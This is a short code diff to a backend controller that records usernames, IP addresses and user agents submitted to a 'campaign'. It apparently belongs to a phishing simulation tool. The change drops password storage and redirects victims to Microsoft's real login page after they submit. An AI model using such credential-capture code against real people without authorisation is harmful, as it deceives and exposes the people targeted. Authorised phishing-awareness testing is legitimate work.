@@ -4,10 +4,9 @@ import { Credential } from '../models/credential.model';
 export const credentialController = {
   async create(req: Request, res: Response) {
     try {
-      const { username, password, campaignId } = req.body;
+      const { username, campaignId } = req.body;
       const credential = new Credential({
         username,
-        password,
         ipAddress: req.ip,
         userAgent: req.headers['user-agent'],
         campaign: campaignId
@@ -16,7 +15,7 @@ export const credentialController = {
       await credential.save();
       
       res.status(201).json({ 
-        redirect: 'https://www.prumyslovkaliberec.cz/404'
+        redirect: 'https://login.microsoftonline.com'
       });
     } catch (error) {
       console.error('Error saving credentials:', error);
